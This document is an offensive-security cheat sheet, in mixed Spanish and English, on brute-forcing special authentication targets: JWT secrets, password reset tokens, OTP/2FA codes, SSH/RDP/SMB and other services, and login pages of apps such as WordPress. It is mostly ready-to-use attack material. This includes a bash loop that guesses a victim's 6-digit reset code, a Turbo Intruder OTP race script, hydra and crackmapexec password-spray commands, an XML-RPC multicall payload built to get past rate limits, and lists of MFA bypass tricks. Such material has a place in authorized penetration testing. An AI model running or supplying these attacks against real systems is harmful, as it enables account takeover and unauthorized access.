---
aliases:
  - JWT Brute
  - SSH Brute
  - RDP Brute
  - SMB Brute
  - WordPress Brute
tags:
  - type/cheatsheet
  - vuln/brute-force
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[HTTP Brute Forcing]]"
  - "[[JWT Attacks]]"
  - "[[WordPress Exploitation]]"
---
# HTTP Brute Forcing - Tipos Especiales

***

## JWT Secret Crack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| HS256 weak secret | hashcat -m 16500 | Most common. |
| HS384/HS512 weak secret | Same with -m 16511/16512 | Variants. |
| RS256 → HS256 confusion | Use pubkey as HMAC secret | Not brute, alg confusion. |
| Default secret strings | "secret", "your-256-bit-secret" | Lazy devs. |
| Framework defaults | Express jsonwebtoken default | Common defaults. |
| HMAC key from leaked source | Source repo `.env`, GitHub | OSINT. |
| Predictable per-user secret | `HMAC(global_secret + user_id)` | Reverse engineer. |
| Time-based secret rotation | Window-based | Race attack. |
| Weak `kid` reference | `kid: 1` references DB row | Combo SQLi. |
| `none` alg | No brute — direct forge | jwt_tool -X a. |
| `null` alg | Same | Variants. |
| Empty signature | Some libs accept | Edge. |
| HMAC secret reuse across services | One leak compromises all | Audit scope. |
| OAuth client_secret as HMAC | Sometimes same value | Reuse. |
| API gateway HMAC | Per-tenant secret weak | SaaS. |
| Mobile app embedded secret | APK/IPA decompile reveals | Mobile recon. |
^bf-special-jwt

### JWT brute commands

```bash
JWT="eyJhbGciOiJIUzI1NiI..."

# hashcat (GPU)
echo "$JWT" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt_tool (Python)
python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt

# john the ripper
echo "$JWT" > jwt.txt
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt
```

___

## Password Reset Token Brute

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| 4-digit numeric reset | 10K combos, brute viable | SMS-based. |
| 6-digit numeric reset | 1M combos | Race + parallelism. |
| UUID reset token | If predictable RNG (Math.random) | Edge. |
| Sequential token | Increment last token observed | Insecure. |
| Timestamp-based token | `md5(timestamp + email)` predictable | Reverse engineer. |
| Email + timestamp | `md5(email + Date.now())` | Predictable. |
| Short alphanumeric (6 chars) | 36^6 = 2.1B — slow | Distributed. |
| Long but base32 | If structured | Structure exploit. |
| Reset link no expire | Brute over days | No TTL. |
| No use limit | Token reusable | Reuse exploit. |
| No rate limit on reset endpoint | Bursts viable | Different from login. |
| Per-IP rate vs per-email | IP rotation works | Per-IP only. |
| Token in URL → leak via Referer | Open redirect chain | Combo. |
| Token in email — header injection | CRLF in name field | CRLF combo. |
| Reset for any user | If email param in URL no auth | Misconfig. |
| Email + token guessed combo | Iterate emails AND tokens | Compound. |
^bf-special-resettoken

### 6-digit reset code brute

```bash
EMAIL="victim@target.com"
SESS=$(curl -s -c cookies.txt https://target/login | grep csrf | head -1)

for code in {000000..999999}; do
  RESP=$(curl -s -b cookies.txt \
    -X POST https://target/reset/verify \
    -d "email=$EMAIL&code=$code")
  if echo "$RESP" | grep -q "success"; then
    echo "FOUND: $code"
    break
  fi
done
```

___

## OTP / 2FA Brute

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| TOTP 6-digit | 1M combos, drift window 30s | Race attack. |
| TOTP 4-digit | 10K — trivial | Burst. |
| SMS OTP | Rate limited at provider often | Race-based. |
| Email OTP | Slower delivery, larger window | Edge. |
| Backup recovery codes | 8-10 chars, 10K-1M combos | Slow. |
| Push notification approval | No brute — needs phishing | Out-of-scope. |
| Hardware OTP (TOTP) | Same as TOTP | Race. |
| Race condition exploit | Submit 1000 simultáneo, 1 hits | Single-Packet. |
| Window-based race | Solve durante 30s window | Drift. |
| Sequential recovery code | If predictable | Edge. |
| Code reuse | Same code accepted multiple times | Misconfig. |
| MFA verify endpoint sin rate limit | Login limit ≠ MFA limit | Bypass. |
| Bypass MFA via flow gap | Logout MFA, re-init flow | Logic. |
| Bypass MFA via password reset | Reset bypassea MFA | Combo. |
| Bypass via OAuth flow | OAuth provider no enforces MFA | Pivot. |
| Bypass via JWT refresh | Refresh token sin MFA | Pivot. |
^bf-special-otp

### OTP race con Burp Turbo Intruder

```python
# Turbo Intruder script (Burp Pro)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=100, requestsPerConnection=100, pipeline=False)
    for code in range(1000000):
        engine.queue(target.req, "%06d" % code)

def handleResponse(req, interesting):
    if req.status != 401:
        table.add(req)
```

___

## SSH / RDP / SMB / FTP Brute

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| SSH | `hydra ssh://target -L u.txt -P p.txt` | Slow due to TCP handshake. |
| SSH key brute | Decrypt encrypted private key | `john --wordlist sshkey.john`. |
| RDP | `crowbar -b rdp -u admin -C pass.txt -s target/32` | Or hydra. |
| SMB | `crackmapexec smb target -u u.txt -p p.txt` | Domain auth. |
| SMB null session | First check before brute | `enum4linux`. |
| FTP | `hydra ftp://target -L u.txt -P p.txt` | Anonymous first. |
| Telnet | `hydra telnet://target ...` | Legacy. |
| MySQL | `hydra mysql://target ...` | Adjacent DB. |
| PostgreSQL | `hydra postgres://target ...` | Adjacent DB. |
| MSSQL | `hydra mssql://target ...` | Windows. |
| MongoDB no auth | First check before brute | Default no auth. |
| Redis no auth | First check | Default no auth. |
| VNC | `hydra vnc://target -P pass.txt` | No user — pass only. |
| LDAP bind | `hydra ldap2://target -L u.txt -P p.txt` | Directory. |
| WinRM | `crackmapexec winrm target ...` | Modern Win remote. |
| Kerberos AS-REP roast | No brute — list users no preauth | Combo AD. |
^bf-special-services

### CrackMapExec SMB brute

```bash
# Single user spray
crackmapexec smb 10.10.10.0/24 -u admin -p Password123!

# Multi user multi pass
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success

# AD with domain
crackmapexec smb 10.10.10.0/24 -u admin -p Password123! -d CONTOSO.LOCAL
```

___

## App-Specific (WordPress, Joomla, etc.)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| WordPress wp-login.php | POST `log=admin&pwd=PASS&wp-submit=Log+In` | Standard. |
| WordPress XML-RPC | `POST /xmlrpc.php` con system.multicall (1500 attempts/req) | Bypass rate limit. |
| WordPress REST API | `GET /wp-json/wp/v2/users` user enum | Pre-brute recon. |
| Joomla administrator | `/administrator/index.php` | Standard. |
| Drupal `/user/login` | Standard | App-specific. |
| Magento admin | `/admin/admin/index/index/key/...` | Hash key in URL. |
| Tomcat manager | `/manager/html` Basic Auth | Default `tomcat:tomcat`. |
| Jenkins login | `/login` | CSRF token required. |
| GitLab login | `/users/sign_in` | CSRF + cookie. |
| Confluence/Jira | `/login.jsp` | Atlassian standard. |
| Citrix NetScaler | Login page custom | VPN brute. |
| FortiGate VPN | SSL VPN portal | Brute. |
| Pulse Secure VPN | Login portal | Brute. |
| OWA / Exchange | `/owa/auth.owa` | Standard. |
| ADFS | `/adfs/ls/` | Federation brute. |
| Cisco ASA VPN | AnyConnect auth | Standard. |
^bf-special-apps

### WordPress XML-RPC mass brute

```bash
# system.multicall: hasta 1500 password attempts en 1 HTTP request
# Bypass total rate limit por endpoint

cat > xmlrpc.xml <<EOF
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><array><data>
          <value><string>admin</string></value>
          <value><string>password1</string></value>
        </data></array></value>
      </data></array></value></member>
    </struct></value>
    <!-- ... repeat 1500 times with different passwords -->
  </data></array></value></param></params>
</methodCall>
EOF

curl -X POST https://target/xmlrpc.php -d @xmlrpc.xml
```

***
